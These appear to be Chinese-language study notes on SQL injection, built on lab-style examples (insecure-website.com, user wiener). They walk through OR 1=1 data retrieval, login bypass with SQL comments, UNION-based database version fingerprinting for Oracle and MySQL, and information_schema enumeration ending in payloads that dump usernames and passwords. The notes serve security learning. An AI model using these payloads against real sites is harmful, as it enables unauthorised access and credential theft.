检索隐藏数据#

一个购物应用展示不同类别的产品。当用户点击**“礼物**”类别时，浏览器会请求以下链接：

https://insecure-website.com/products?category=Gifts

这会导致应用程序进行SQL查询，从数据库中检索相关产品的详细信息：

SELECT * FROM products WHERE category = 'Gifts' AND released = 1

如果要让应用程序显示任何类别的所有产品，包括他们不知道的类别：

https://insecure-website.com/products?category=Gifts'+OR+1=1--

这会得到以下SQL查询：

SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1

允许登录绕过#

应用程序，允许用户用用户名和密码登录。如果用户提交用户名wiener和密码bluecheese，应用程序通过执行以下SQL查询来检查凭证：

SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'

如果查询返回了用户的详细信息，则登录成功。否则，它将被拒绝。 在这种情况下，攻击者可以以任何用户身份登录，无需密码。他们可以通过SQL注释序列来移除查询从句中的密码检查。例如，提交用户名和空密码会得到以下查询：

SELECT * FROM users WHERE username = 'administrator'--' AND password = ''

该查询返回了该用户，并成功将攻击者登录为该用户。

检查数据库#

查询Oracle数据库类型和版本#

先使用order by判断列数，发现是2列。于是，使用union确定查询返回的列数以及哪些列包含文本：

1'union select 'a','a' from dual--

dual是Oracle数据库中的一个虚拟表（或称伪表），它只有一行一列，用于执行没有真实表可用的 SELECT语句或计算表达式。Oracle必须跟一个表名，如select * from dual 可以判断查询返回了包含文本的两列。所以用以下查询得到Oracle数据库版本信息：

1'+UNION+SELECT+BANNER,+NULL+FROM+v$version--

查询MySQL数据库类型和版本#

需上面类似，注意查询的不同即可：

1' order by 2
2' union select 'a','a'-- 
3' union select @@version,null--

查询数据库内容#

大多数数据库类型（除了 Oracle 之外）都有一组称为信息模式的视图。这提供了关于数据库的信息。可以查询以列出数据库中的表格：

SELECT * FROM information_schema.tables

此时返回的输出如下：

TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE
MyDatabase dbo Products BASE TABLE
MyDatabase dbo Users BASE TABLE
MyDatabase dbo Feedback BASE TABLE

该输出表明有三个表，分别称为Products 、Users 和 Feedback

然后你可以查询列出单独表中的列：

SELECT * FROM information_schema.columns WHERE table_name = 'Users'

此时返回的输出如下：

TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE
MyDatabase dbo Users UserId int
MyDatabase dbo Users Username varchar
MyDatabase dbo Users Password varchar

在Oracle上，你可以找到以下相同的信息：

  • 可以通过查询列出表格：

    SELECT * FROM all_tables

  • 可以通过查询列出列：

    SELECT * FROM all_tab_columns WHERE table_name = 'USERS'

以非Oracle数据库为例：

1' order by 2 --+  # 得到有2列
2category=Pet'union select table_name,null from information_schema.tables--  # 得到数据库中的表名users_abcdef
3'union select column_name,null from information_schema.columns where table_name='users_abcdef'--  # 得到需要的列名names和keys
4'union select names, keys from users_abcdef--  # 得到用户名和密码

当然，有时候数据库中不止有一个表，这样就不能通过1列完整显示出来。于是，采用group_concat函数：

1' order by 3 %23  # 得到有3列
2'union select null,null,group_concat(table_name) from information_schema.tables where table_schema=database()%23  # 得到数据库中的表名，而且不用再查询库名
3'union select null,null,group_concat(column_name) from information_schema.columns where table_name='users_abcdef'%23  # 得到需要的列名names和keys
4'union select null,null,group_concat(id) from users_abcdef%23  # 得到id
